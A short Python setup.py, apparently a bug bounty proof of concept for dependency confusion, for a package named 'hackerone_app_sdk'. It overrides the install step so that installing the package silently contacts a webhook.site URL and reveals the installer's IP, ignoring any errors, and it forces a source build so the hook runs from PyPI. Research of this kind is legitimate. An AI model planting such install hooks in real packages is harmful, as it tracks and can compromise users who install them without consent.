from setuptools import setup
from setuptools.command.install import install
import urllib.request

# Replace this with your own webhook.site URL
BEACON_URL = "https://webhook.site/f899db46-9633-4ce7-a5e4-01b26fd0e940"

class InstallWithBeacon(install):
    def run(self):
        try:
            # Fire a GET request (captures installer’s IP)
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="hackerone_app_sdk",
    version="0.18.0",
    packages=["hackerone_app_sdk"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
    # Force only sdist (no wheel) to ensure this code runs from PyPI
    options={"bdist_wheel": {"universal": False}},
)
